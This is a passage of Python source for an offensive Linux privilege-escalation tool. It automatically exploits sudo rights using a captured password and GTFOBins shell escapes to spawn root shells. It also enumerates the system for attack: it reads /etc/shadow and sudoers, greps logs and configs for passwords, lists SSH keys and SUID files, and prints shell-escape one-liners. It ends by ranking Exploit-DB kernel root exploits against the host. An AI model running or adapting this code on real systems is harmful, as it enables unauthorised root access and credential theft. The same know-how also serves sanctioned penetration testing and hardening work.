	child = sub.Popen(binary, shell=True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE)
	stdout, stderr = child.communicate(b'whoami')
	if stdout == b'root\n':
		return True


def checkIFSudoRootWithPass(binary, passwd):
	cmd_to_passwd = "echo '{passwd}' | sudo -S cat /etc/sudoers".format(passwd=passwd)
	print("trying " + binary)
	child = sub.Popen(cmd_to_passwd, shell=True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE)
	time.sleep(3)
	child1 = sub.Popen(binary, shell=True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE)
	time.sleep(3)
	stdout, err = child1.communicate(b'whoami')
	if stdout == b'root\n':
		print("True")
		return True
	else:
		return False


def checkSudo_i(passwd):
	cmd = 'echo "{passwd}" | sudo -S -i'.format(passwd=passwd)
	child = sub.Popen(cmd, shell=True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE)
	stdout, stderr = child.communicate(b'whoami')
	if stdout == b'root\n':
		return True
	else:
		return False


def sudoprivescalation():
	userPass = ifUserhasPass()
	sudoPass = ifSudo_lreqPass()

	# Check if the attecker has the password of the running user system
	if userPass:
		password = getUserPass()

	# Cas 1
	if userPass:
		if checkSudo_i(password):
			return sub.Popen('echo "{passwd}" | sudo -S -i'.format(passwd=password), shell=True).wait()
		else:
			print("Sudo -i not working ")

	if (userPass and sudoPass):
		sudo_list_Pass = getListofRootCmdwithPass(getcmdwithSudoWithPass(password))
		cmd_Pass = matchSudobinaries(sudo_list_Pass)
		cmd_no_pass = matchSudobinaries(getListofCmdwithRoot(getcmdwithSudoWithPass(password)))

		for cmd in cmd_no_pass:
			try:
				if checkIFSudoRootWithNoPass(gtfobinsDict1[cmd]):
					root = True
					return sub.Popen(gtfobinsDict1[cmd], shell=True).wait()
				else:
					print("seems like you are not running as root with " + cmd)
			except:
				print("something went wrong while executing " + cmd)

		for cmd in cmd_Pass:
			try:
				if checkIFSudoRootWithPass(gtfobinsDict1[cmd], password):
					root = True
					return sub.Popen(gtfobinsDict1[cmd], shell=True).wait()
				else:
					print("seems like you can't run as root with " + cmd)
			except:
				print("Somthin went wrong while executing " + cmd)

	# if the attacker has the password but sudo -l doesn't requires a passwd
	# Cas 2.2
	if (userPass and not sudoPass):
		sudo_list_Pass = getListofRootCmdwithPass(getcmdwithSudo())
		cmd_Pass = matchSudobinaries(sudo_list_Pass)
		cmd_no_pass = matchSudobinaries(getListofCmdwithRoot(getcmdwithSudo()))

		for cmd in cmd_Pass:
			try:
				if checkIFSudoRootWithPass(gtfobinsDict1[cmd], password):
					return sub.Popen(gtfobinsDict1[cmd], shell=True).wait()
				else:
					print("seems like you can't run as root with " + cmd)
			except:
				print("Something went wrong while executing " + cmd)

		for cmd in cmd_no_pass:
			try:
				if checkIFSudoRootWithNoPass(gtfobinsDict1[cmd]):
					return sub.Popen(gtfobinsDict1[cmd], shell=True).wait()
				else:
					print("seems like you are not running as root with " + cmd)
			except:
				print("something went wrong while executing " + cmd)

	# if the attacker has no password but can execute sudo  -l
	# Cas 2.3
	if (not userPass and not sudoPass):
		binaries = matchSudobinaries(getListofCmdwithRoot(getcmdwithSudo()))
		#print(binaries)
		for binary in binaries:
			try:
				if checkIFSudoRootWithNoPass(gtfobinsDict1[binary]):
					return sub.Popen(gtfobinsDict1[binary], shell=True).wait()
				else:
					print("failed with binary " + binary)
			except:
				return "Something went wrong while executing command : " + gtfobinsDict1[binary]

	if userPass and ifdefault(password, sudoPass):

		for key in gtfobinsDict1.keys():
			try:
				if checkIFSudoRootWithPass(gtfobinsDict1[key], password):
					return sub.Popen(gtfobinsDict1[key], shell=True).wait()
				else:
					print("seems like you can't run as root with " + cmd)
			except:
				print("Somthing went wrong while executing " + cmd)



appendToFile(bigline)
appendToFile("LINUX PRIVILEGE ESCALATION CHECKER")
appendToFile(bigline + "\n")

# Basic system info
appendToFile("[*] GETTING BASIC SYSTEM INFO...\n")
results = []
sysInfo = {"OS": {"cmd": "cat /etc/issue", "msg": "Operating System", "results": results},
           "KERNEL": {"cmd": "cat /proc/version", "msg": "Kernel", "results": results},
           "SELINUX_status": {"cmd": "cat /etc/sysconfig/selinux", "msg": "SELinux", "results": results},
           "VERSION": {"cmd": "cat /proc/version", "msg": "Version", "results": results},
           "ALL": {"cmd": "uname -a", "msg": "All", "results": results},
           "HOSTNAME": {"cmd": "hostname", "msg": "Hostname", "results": results}
           }

sysInfo = execCmd(sysInfo)
printResults(sysInfo)

# Networking Info

appendToFile("[*] GETTING NETWORKING INFO...\n")

netInfo = {"NETINFO": {"cmd": "/sbin/ifconfig -a", "msg": "Interfaces", "results": results},
           "ROUTE": {"cmd": "route", "msg": "Route", "results": results},
           "NETSTAT": {"cmd": "netstat -antup | grep -v 'TIME_WAIT'", "msg": "Netstat", "results": results}
           }

netInfo = execCmd(netInfo)
printResults(netInfo)

# File System Info
appendToFile("[*] GETTING FILESYSTEM INFO...\n")

driveInfo = {"MOUNT": {"cmd": "mount", "msg": "Mount results", "results": results},
             "FSTAB": {"cmd": "cat /etc/fstab 2>/dev/null", "msg": "fstab entries", "results": results}
             }

driveInfo = execCmd(driveInfo)
printResults(driveInfo)

# Scheduled Cron Jobs
cronInfo = {"CRON": {"cmd": "ls -la /etc/cron* 2>/dev/null", "msg": "Scheduled cron jobs", "results": results},
            "CRONW": {"cmd": "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null",
                      "msg": "Writable cron dirs", "results": results}
            }

cronInfo = execCmd(cronInfo)
printResults(cronInfo)

# User Info
appendToFile("\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n")

userInfo = {"WHOAMI": {"cmd": "whoami", "msg": "Current User", "results": results},
            "ID": {"cmd": "id", "msg": "Current User ID", "results": results},
            "ALLUSERS": {"cmd": "cat /etc/passwd", "msg": "All users", "results": results},
            "SUPUSERS": {"cmd": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
                         "msg": "Super Users Found:", "results": results},
            "HISTORY": {"cmd": "ls -la ~/.*_history; ls -la /root/.*_history 2>/dev/null",
                        "msg": "Root and current user history (depends on privs)", "results": results},
            "ENV": {"cmd": "env 2>/dev/null | grep -v 'LS_COLORS'", "msg": "Environment", "results": results},
            "SUDOERS": {"cmd": "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null", "msg": "Sudoers (privileged)",
                        "results": results},
            "MAIL": {"cmd": "ls -alh /var/mail/", "msg": "Mail", "results": results},
            "LOGGEDIN": {"cmd": "w 2>/dev/null", "msg": "Logged in User Activity", "results": results}
            }

userInfo = execCmd(userInfo)
printResults(userInfo)

if "root" in userInfo["ID"]["results"][0]:
	appendToFile("[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?\n")

# File/Directory Privs
appendToFile("[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...\n")

fdPerms = {"WWDIRSROOT": {
	"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root",
	"msg": "World Writeable Directories for User/Group 'Root'", "results": results},
	"WWDIRS": {
		"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root",
		"msg": "World Writeable Directories for Users other than Root", "results": results},
	"WWFILES": {
		"cmd": "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null",
		"msg": "World Writable Files", "results": results},
	"SUID": {"cmd": "find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null",
	         "msg": "SUID/SGID Files and Directories", "results": results},
	"SSH": {"cmd": "ls -la ~/.ssh/", "msg": "Check for interesting ssh files in the current users’ directory",
	        "results": results},
	"ROOTHOME": {"cmd": "ls -ahlR /root 2>/dev/null", "msg": "Checking if root's home folder is accessible",
	             "results": results}
}

fdPerms = execCmd(fdPerms)
print(fdPerms)
printResults(fdPerms)

pwdFiles = {"LOGPWDS": {"cmd": "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
                        "msg": "Logs containing keyword 'password'", "results": results},
            "CONFPWDS": {"cmd": "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
                         "msg": "Config files containing keyword 'password'", "results": results},
            "CONFPPHP": {
	            "cmd": "find /var/www -name '*.php*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
	            "msg": "Php files containing keyword 'password'", "results": results},
            "CONFPPHP": {"cmd": "find /etc -name '*.conf*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
                         "msg": "Config files containing keyword 'password'", "results": results},
            "FSTAB": {"cmd": "cat /etc/fstab", "msg": "Fstab", "results": results},
            "SHADOW": {"cmd": "cat /etc/shadow 2>/dev/null", "msg": "Shadow File (Privileged)", "results": results}
            #"ALL_PASS": {"cmd": "grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always 2> /dev/null", "msg": "All found passwords", "results":results}, 
            #"MEMORY_PASS" {"cmd": "strings /dev/mem -n10 | grep -i PASS", "msg": "Passwords found in memory", "results":results},
            #"FILE_NAMED_PASSWORD" {"cmd": "locate password", "msg": "File named password are located at", "results":results},
            #"SENSITIVE_FILES" {"cmd": "find / -name authorized_keys 2> /dev/null", "msg": "Sensitive files", "results":results},
            #"ID_RSA" {"cmd": "find / -name id_rsa 2> /dev/null", "msg":"ID RSA", "results":results}
            }

pwdFiles = execCmd(pwdFiles)
printResults(pwdFiles)

# Processes and Applications
appendToFile("[*] ENUMERATING PROCESSES AND APPLICATIONS...\n")

if "debian" in sysInfo["KERNEL"]["results"][0] or "ubuntu" in sysInfo["KERNEL"]["results"][0]:
	getPkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'"  # debian
else:
	getPkgs = "rpm -qa | sort -u"  # RH/other

getAppProc = {
	"PROCS": {"cmd": "ps aux | awk '{print $1,$2,$9,$10,$11}'", "msg": "Current processes", "results": results},
	"PKGS": {"cmd": getPkgs, "msg": "Installed Packages", "results": results}
}

getAppProc = execCmd(getAppProc)
printResults(getAppProc)  # comment to reduce output

sshinfo = {
	"SSH Authorized_keys": {"cmd": "cat ~/.ssh/authorized_keys", "msg": "SSH Authorized_keys", "results": results},
	"SSH_identiti pub": {"cmd": "cat ~/.ssh/identity.pub", "msg": "SSH_identiti pub", "results": results},
	"APACHECONF": {"cmd": "cat /etc/apache2/apache2.conf 2>/dev/null", "msg": "Apache Config File", "results": results}
}

sshinfo = execCmd(sshinfo)
printResults(sshinfo)

otherApps = {"SUDO": {"cmd": "sudo -V | grep version 2>/dev/null",
                      "msg": "Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)",
                      "results": results},
             "APACHE": {"cmd": "apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
                        "msg": "Apache Version and Modules", "results": results},
             "MYSQL_ROOT": {"cmd": "ps aux | grep root | grep mysql", "msg": "Check if mysql process is root",
                            "results": results},
             "APACHECONF": {"cmd": "cat /etc/apache2/apache2.conf 2>/dev/null", "msg": "Apache Config File",
                            "results": results}
             }

otherApps = execCmd(otherApps)
printResults(otherApps)

appendToFile("[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n")

# find the package information for the processes currently running
# under root or another super user

procs = getAppProc["PROCS"]["results"]
pkgs = getAppProc["PKGS"]["results"]
supusers = userInfo["SUPUSERS"]["results"]
procdict = {}  # dictionary to hold the processes running as super users

for proc in procs:  # loop through each process
	relatedpkgs = []  # list to hold the packages related to a process
	try:
		for user in supusers:  # loop through the known super users
			if (user != "") and (user in proc):  # if the process is being run by a super user
				procname = proc.split(" ")[4]  # grab the process name
				if "/" in procname:
					splitname = procname.split("/")
					procname = splitname[len(splitname) - 1]
				for pkg in pkgs:  # loop through the packages
					if not len(procname) < 3:  # name too short to get reliable package results
						if procname in pkg:
							if procname in procdict:
								relatedpkgs = procdict[proc]  # if already in the dict, grab its pkg list
							if pkg not in relatedpkgs:
								relatedpkgs.append(pkg)  # add pkg to the list
				procdict[proc] = relatedpkgs  # add any found related packages to the process dictionary entry
	except:
		pass

for key in procdict:
	appendToFile("    " + key)  # print the process name
	try:
		if not procdict[key][0] == "":  # only print the rest if related packages were found
			appendToFile("        Possible Related Packages: ")
			for entry in procdict[key]:
				appendToFile("            " + entry)  # print each related package
	except:
		pass

# EXPLOIT ENUMERATION

# First discover the avaialable tools
appendToFile("\n[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n")

devTools = {"TOOLS": {"cmd": "which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null",
                      "msg": "Installed Tools", "results": results}}
devTools = execCmd(devTools)
printResults(devTools)

appendToFile("[+] Related Shell Escape Sequences...\n")
escapeCmd = {"vi": [":!bash", ":set shell=/bin/bash:shell"], "awk": ["awk 'BEGIN {system(\"/bin/bash\")}'"],
             "perl": ["perl -e 'exec \"/bin/bash\";'"],
             "find": ["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"], "nmap": ["--interactive"]}
for cmd in escapeCmd:
	for result in devTools["TOOLS"]["results"]:
		if cmd in result:
			for item in escapeCmd[cmd]:
				appendToFile("    " + cmd + "-->\t" + item)
appendToFile("\n\n[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...\n")

# Now check for relevant exploits (note: this list should be updated over time; source: Exploit-DB)
# sploit format = sploit name : {minversion, maxversion, exploitdb#, language, {keywords for applicability}} -- current keywords are 'kernel', 'proc', 'pkg' (unused), and 'os'
sploits = {"2.2.x-2.4.x ptrace kmod local exploit": {"minver": "2.2", "maxver": "2.4.99", "exploitdb": "3", "lang": "c",
                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "< 2.4.20 Module Loader Local Root Exploit": {"minver": "0", "maxver": "2.4.20", "exploitdb": "12",
                                                         "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4.22 "'do_brk()'" local Root Exploit (PoC)": {"minver": "2.4.22", "maxver": "2.4.22", "exploitdb": "129",
                                                            "lang": "asm",
                                                            "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "<= 2.4.22 (do_brk) Local Root Exploit (working)": {"minver": "0", "maxver": "2.4.22", "exploitdb": "131",
                                                               "lang": "c",
                                                               "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4.x mremap() bound checking Root Exploit": {"minver": "2.4", "maxver": "2.4.99", "exploitdb": "145",
                                                          "lang": "c",
                                                          "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "<= 2.4.29-rc2 uselib() Privilege Elevation": {"minver": "0", "maxver": "2.4.29", "exploitdb": "744",
                                                          "lang": "c",
                                                          "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4 uselib() Privilege Elevation Exploit": {"minver": "2.4", "maxver": "2.4", "exploitdb": "778",
                                                        "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit": {"minver": "2.4", "maxver": "2.6.99",
                                                                         "exploitdb": "895", "lang": "c",
                                                                         "keywords": {"loc": ["kernel"],
                                                                                      "val": "kernel"}},
           "2.4/2.6 bluez Local Root Privilege Escalation Exploit (update)": {"minver": "2.4", "maxver": "2.6.99",
                                                                              "exploitdb": "926", "lang": "c",
                                                                              "keywords": {"loc": ["proc", "pkg"],
                                                                                           "val": "bluez"}},
           "<= 2.6.11 (CPL 0) Local Root Exploit (k-rad3.c)": {"minver": "0", "maxver": "2.6.11", "exploitdb": "1397",
                                                               "lang": "c",
                                                               "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit": {"minver": "0", "maxver": "99",
                                                                                      "exploitdb": "1518", "lang": "c",
                                                                                      "keywords": {
	                                                                                      "loc": ["proc", "pkg"],
	                                                                                      "val": "mysql"}},
           "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                 "exploitdb": "2004", "lang": "c",
                                                                 "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (2)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                     "exploitdb": "2005", "lang": "c",
                                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (3)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                     "exploitdb": "2006", "lang": "c",
                                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (4)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                     "exploitdb": "2011", "lang": "sh",
                                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "<= 2.6.17.4 (proc) Local Root Exploit": {"minver": "0", "maxver": "2.6.17.4", "exploitdb": "2013",
                                                     "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.6.13 <= 2.6.17.4 prctl() Local Root Exploit (logrotate)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                         "exploitdb": "2031", "lang": "c",
                                                                         "keywords": {"loc": ["kernel"],
                                                                                      "val": "kernel"}},
           "Ubuntu/Debian Apache 1.3.33/1.3.34 (CGI TTY) Local Root Exploit": {"minver": "4.10", "maxver": "7.04",
                                                                               "exploitdb": "3384", "lang": "c",
                                                                               "keywords": {"loc": ["os"],
                                                                                            "val": "debian"}},
           "Linux/Kernel 2.4/2.6 x86-64 System Call Emulation Exploit": {"minver": "2.4", "maxver": "2.6",
                                                                         "exploitdb": "4460", "lang": "c",
                                                                         "keywords": {"loc": ["kernel"],
                                                                                      "val": "kernel"}},
           "< 2.6.11.5 BLUETOOTH Stack Local Root Exploit": {"minver": "0", "maxver": "2.6.11.5", "exploitdb": "4756",
                                                             "lang": "c",
                                                             "keywords": {"loc": ["proc", "pkg"], "val": "bluetooth"}},
           "2.6.17 - 2.6.24.1 vmsplice Local Root Exploit": {"minver": "2.6.17", "maxver": "2.6.24.1",
                                                             "exploitdb": "5092", "lang": "c",
                                                             "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.6.23 - 2.6.24 vmsplice Local Root Exploit": {"minver": "2.6.23", "maxver": "2.6.24", "exploitdb": "5093",
                                                           "lang": "c", "keywords": {"loc": ["os"], "val": "debian"}},
           "Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit": {"minver": "0", "maxver": "99",
                                                                      "exploitdb": "5720", "lang": "python",
                                                                      "keywords": {"loc": ["os"], "val": "debian"}},
           "Linux Kernel < 2.6.22 ftruncate()/open() Local Exploit": {"minver": "0", "maxver": "2.6.22",
                                                                      "exploitdb": "6851", "lang": "c",
                                                                      "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "< 2.6.29 exit_notify() Local Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.29",
                                                                         "exploitdb": "8369", "lang": "c",
                                                                         "keywords": {"loc": ["kernel"],
                                                                                      "val": "kernel"}},
           "2.6 UDEV Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99", "exploitdb": "8478",
                                                           "lang": "c",
                                                           "keywords": {"loc": ["proc", "pkg"], "val": "udev"}},
           "2.6 UDEV < 141 Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99",
                                                                 "exploitdb": "8572", "lang": "c",
                                                                 "keywords": {"loc": ["proc", "pkg"], "val": "udev"}},
           "2.6.x ptrace_attach Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99",
                                                                      "exploitdb": "8673", "lang": "c",
                                                                      "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.6.29 ptrace_attach() Local Root Race Condition Exploit": {"minver": "2.6.29", "maxver": "2.6.29",
                                                                        "exploitdb": "8678", "lang": "c",
                                                                        "keywords": {"loc": ["kernel"],
                                                                                     "val": "kernel"}},
           "Linux Kernel <=2.6.28.3 set_selection() UTF-8 Off By One Local Exploit": {"minver": "0",
                                                                                      "maxver": "2.6.28.3",
                                                                                      "exploitdb": "9083", "lang": "c",
                                                                                      "keywords": {"loc": ["kernel"],
                                                                                                   "val": "kernel"}},
           "Test Kernel Local Root Exploit 0day": {"minver": "2.6.18", "maxver": "2.6.30", "exploitdb": "9191",
                                                   "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "PulseAudio (setuid) Priv. Escalation Exploit (ubu/9.04)(slack/12.2.0)": {"minver": "2.6.9",
                                                                                     "maxver": "2.6.30",
                                                                                     "exploitdb": "9208", "lang": "c",
                                                                                     "keywords": {"loc": ["pkg"],
                                                                                                  "val": "pulse"}},
           "2.x sock_sendpage() Local Ring0 Root Exploit": {"minver": "2", "maxver": "2.99", "exploitdb": "9435",
                                                            "lang": "c",
                                                            "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.x sock_sendpage() Local Root Exploit 2": {"minver": "2", "maxver": "2.99", "exploitdb": "9436",
                                                        "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver)": {"minver": "2.4", "maxver": "2.6.99",
                                                                       "exploitdb": "9479", "lang": "c",
                                                                       "keywords": {"loc": ["kernel"],
                                                                                    "val": "kernel"}},
           "2.6 < 2.6.19 (32bit) ip_append_data() ring0 Root Exploit": {"minver": "2.6", "maxver": "2.6.19",
                                                                        "exploitdb": "9542", "lang": "c",
                                                                        "keywords": {"loc": ["kernel"],
                                                                                     "val": "kernel"}},
           "2.4/2.6 sock_sendpage() Local Root Exploit (ppc)": {"minver": "2.4", "maxver": "2.6.99",
                                                                "exploitdb": "9545", "lang": "c",
                                                                "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "< 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)": {"minver": "0", "maxver": "2.6.19", "exploitdb": "9574",
                                                                 "lang": "c",
                                                                 "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "< 2.6.19 udp_sendmsg Local Root Exploit": {"minver": "0", "maxver": "2.6.19", "exploitdb": "9575",
                                                       "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4/2.6 sock_sendpage() Local Root Exploit [2]": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9598",
                                                              "lang": "c",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4/2.6 sock_sendpage() Local Root Exploit [3]": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9641",
                                                              "lang": "c",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4.1-2.4.37 and 2.6.1-2.6.32-rc5 Pipe.c Privelege Escalation": {"minver": "2.4.1", "maxver": "2.6.32",
                                                                             "exploitdb": "9844", "lang": "python",
                                                                             "keywords": {"loc": ["kernel"],
                                                                                          "val": "kernel"}},
           "'pipe.c' Local Privilege Escalation Vulnerability": {"minver": "2.4.1", "maxver": "2.6.32",
                                                                 "exploitdb": "10018", "lang": "sh",
                                                                 "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.6.18-20 2009 Local Root Exploit": {"minver": "2.6.18", "maxver": "2.6.20", "exploitdb": "10613",
                                                 "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "Apache Spamassassin Milter Plugin Remote Root Command Execution": {"minver": "0", "maxver": "99",
                                                                               "exploitdb": "11662", "lang": "sh",
                                                                               "keywords": {"loc": ["proc"],
                                                                                            "val": "spamass-milter"}},
           "<= 2.6.34-rc3 ReiserFS xattr Privilege Escalation": {"minver": "0", "maxver": "2.6.34",
                                                                 "exploitdb": "12130", "lang": "python",
                                                                 "keywords": {"loc": ["mnt"], "val": "reiser"}},
           "Ubuntu PAM MOTD local root": {"minver": "7", "maxver": "10.04", "exploitdb": "14339", "lang": "sh",
                                          "keywords": {"loc": ["os"], "val": "ubuntu"}},
           "< 2.6.36-rc1 CAN BCM Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.36",
                                                                 "exploitdb": "14814", "lang": "c",
                                                                 "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "Kernel ia32syscall Emulation Privilege Escalation": {"minver": "0", "maxver": "99", "exploitdb": "15023",
                                                                 "lang": "c",
                                                                 "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "Linux RDS Protocol Local Privilege Escalation": {"minver": "0", "maxver": "2.6.36", "exploitdb": "15285",
                                                             "lang": "c",
                                                             "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "<= 2.6.37 Local Privilege Escalation": {"minver": "0", "maxver": "2.6.37", "exploitdb": "15704",
                                                    "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "< 2.6.37-rc2 ACPI custom_method Privilege Escalation": {"minver": "0", "maxver": "2.6.37",
                                                                    "exploitdb": "15774", "lang": "c",
                                                                    "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "CAP_SYS_ADMIN to root Exploit": {"minver": "0", "maxver": "99", "exploitdb": "15916", "lang": "c",
                                             "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit)": {"minver": "0", "maxver": "99", "exploitdb": "15944",
                                                               "lang": "c",
                                                               "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "< 2.6.36.2 Econet Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.36.2", "exploitdb": "17787",
                                                              "lang": "c",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "Sendpage Local Privilege Escalation": {"minver": "0", "maxver": "99", "exploitdb": "19933", "lang": "ruby",
                                                   "keywords": {"loc": ["kernel"], "val": "kernel"}},
           "2.4.18/19 Privileged File Descriptor Resource Exhaustion Vulnerability": {"minver": "2.4.18",
                                                                                      "maxver": "2.4.19",
                                                                                      "exploitdb": "21598", "lang": "c",
                                                                                      "keywords": {"loc": ["kernel"],
                                                                                                   "val": "kernel"}},
           "2.2.x/2.4.x Privileged Process Hijacking Vulnerability (1)": {"minver": "2.2", "maxver": "2.4.99",
                                                                          "exploitdb": "22362", "lang": "c",
                                                                          "keywords": {"loc": ["kernel"],
                                                                                       "val": "kernel"}},
           "2.2.x/2.4.x Privileged Process Hijacking Vulnerability (2)": {"minver": "2.2", "maxver": "2.4.99",
                                                                          "exploitdb": "22363", "lang": "c",
                                                                          "keywords": {"loc": ["kernel"],
                                                                                       "val": "kernel"}},
           "Samba 2.2.8 Share Local Privilege Elevation Vulnerability": {"minver": "2.2.8", "maxver": "2.2.8",
                                                                         "exploitdb": "23674", "lang": "c",
                                                                         "keywords": {"loc": ["proc", "pkg"],
                                                                                      "val": "samba"}},
           "open-time Capability file_ns_capable() - Privilege Escalation Vulnerability": {"minver": "0",
                                                                                           "maxver": "99",
                                                                                           "exploitdb": "25307",
                                                                                           "lang": "c", "keywords": {
		           "loc": ["kernel"], "val": "kernel"}},
           "open-time Capability file_ns_capable() Privilege Escalation": {"minver": "0", "maxver": "99",
                                                                           "exploitdb": "25450", "lang": "c",
                                                                           "keywords": {"loc": ["kernel"],
                                                                                        "val": "kernel"}},
           }

# variable declaration
operatinSys = sysInfo["OS"]["results"][0]
version = sysInfo["KERNEL"]["results"][0].split(" ")[2].split("-")[0]
langs = devTools["TOOLS"]["results"]
procs = getAppProc["PROCS"]["results"]
kernel = str(sysInfo["KERNEL"]["results"][0])
mount = driveInfo["MOUNT"]["results"]
# pkgs = getAppProc["PKGS"]["results"] # currently not using packages for sploit appicability but my in future


# lists to hold ranked, applicable sploits
# note: this is a best-effort, basic ranking designed to help in prioritizing priv escalation exploit checks
# all applicable exploits should be checked and this function could probably use some improvement
avgprob = []
highprob = []

for sploit in sploits:
	lang = 0  # use to rank applicability of sploits
	keyword = sploits[sploit]["keywords"]["val"]
	sploitout = sploit + " || " + "http://www.exploit-db.com/exploits/" + sploits[sploit][
		"exploitdb"] + " || " + "Language=" + sploits[sploit]["lang"]
	# first check for kernell applicability
	if (version >= sploits[sploit]["minver"]) and (version <= sploits[sploit]["maxver"]):
		# next check language applicability
		if (sploits[sploit]["lang"] == "c") and (("gcc" in str(langs)) or ("cc" in str(langs))):
			lang = 1  # language found, increase applicability score
		elif sploits[sploit]["lang"] == "sh":
			lang = 1  # language found, increase applicability score
		elif (sploits[sploit]["lang"] in str(langs)):
			lang = 1  # language found, increase applicability score
		if lang == 0:
			sploitout = sploitout + "**"  # added mark if language not detected on system
		# next check keyword matches to determine if some sploits have a higher probability of success
		for loc in sploits[sploit]["keywords"]["loc"]:
			if loc == "proc":
				for proc in procs:
					if keyword in proc:
						highprob.append(
							sploitout)  # if sploit is associated with a running process consider it a higher probability/applicability
						break
						break
			elif loc == "os":
				if (keyword in operatinSys) or (keyword in kernel):
					highprob.append(
						sploitout)  # if sploit is specifically applicable to this OS consider it a higher probability/applicability
					break
			elif loc == "mnt":
				if keyword in mount:
					highprob.append(
						sploitout)  # if sploit is specifically applicable to a mounted file system consider it a higher probability/applicability
					break
			else:
				avgprob.append(
					sploitout)  # otherwise, consider average probability/applicability based only on kernel version

appendToFile(
	"    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!\n")
appendToFile(
	"    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system")
for exploit in highprob:
	appendToFile("    - " + exploit)
